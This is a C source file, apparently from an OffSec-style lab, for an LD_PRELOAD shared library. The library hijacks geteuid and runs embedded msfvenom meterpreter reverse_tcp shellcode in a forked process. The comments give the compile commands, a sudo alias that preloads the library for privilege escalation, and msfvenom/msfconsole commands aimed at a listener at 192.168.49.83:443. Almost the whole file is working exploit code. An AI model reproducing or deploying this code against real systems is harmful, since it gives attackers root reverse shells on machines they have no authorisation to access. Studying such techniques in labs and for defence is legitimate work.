// gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
// gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
// PrivEsc
// alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"

#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.83 LPORT=443 -f c -o shell.c -b '\x00'
// sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.49.83; set LPORT 443; run"

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x53\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
    {
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2;
}
